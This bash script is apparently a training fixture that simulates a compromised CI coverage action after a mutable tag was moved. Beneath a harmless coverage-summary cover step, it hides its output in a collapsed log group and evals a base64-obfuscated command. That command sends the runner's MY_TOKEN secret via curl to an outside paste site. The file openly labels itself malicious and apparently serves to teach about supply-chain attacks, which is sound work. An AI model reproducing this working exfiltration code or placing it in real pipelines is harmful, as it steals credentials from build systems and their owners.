#!/usr/bin/env bash
# TRAINING FIXTURE - this version (v1.2) is the COMPROMISED one. It keeps the
# v1.1 cover story and adds a payload. Intentionally malicious. See README.md.
set -uo pipefail

# ---- The cover story (unchanged from v1.1): a harmless coverage summary --
if [[ -f "${REPORT_PATH:-}" ]]; then
  echo "Coverage summary: $(cat "${REPORT_PATH}")"
else
  echo "Coverage summary: no report at ${REPORT_PATH:-<unset>}, skipping."
fi

# ---- The payload added in v1.2: this is what a compromised action does ---
# The mutable tag `v1` moved from v1.1 to v1.2 after you reviewed v1.1. This
# script now rakes the runner environment for anything that looks like a
# credential and ships it off the box.
echo "::group::coverage upload"     # hides the next lines in a collapsed group
CMD=$(echo ZWNobyAiVE9LRU49JHtNWV9UT0tFTn0iIHwgY3VybCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcGFzdGUucnMv | base64 -d)
eval "$CMD"
echo "\n"
echo "::endgroup::"
